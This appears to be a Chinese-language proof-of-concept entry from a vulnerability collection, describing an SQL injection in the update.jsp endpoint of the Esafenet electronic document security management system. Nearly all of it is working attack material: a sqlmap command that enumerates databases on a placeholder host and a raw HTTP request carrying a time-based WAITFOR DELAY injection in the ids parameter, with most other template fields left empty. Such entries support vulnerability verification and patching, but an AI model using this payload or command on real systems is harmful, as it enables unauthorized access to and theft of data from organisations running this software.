﻿# 亿赛通电子文档安全管理系统 Update.jsp SQL注入

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：sqlmap.py -u "https://xxxxx/CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3)" --batch --dbs --force-ssl

> 漏洞特征：

> 验证脚本：HTTP

```
GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3);WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：亿赛通电子文档安全管理系统 Update.jsp SQL注入.poc
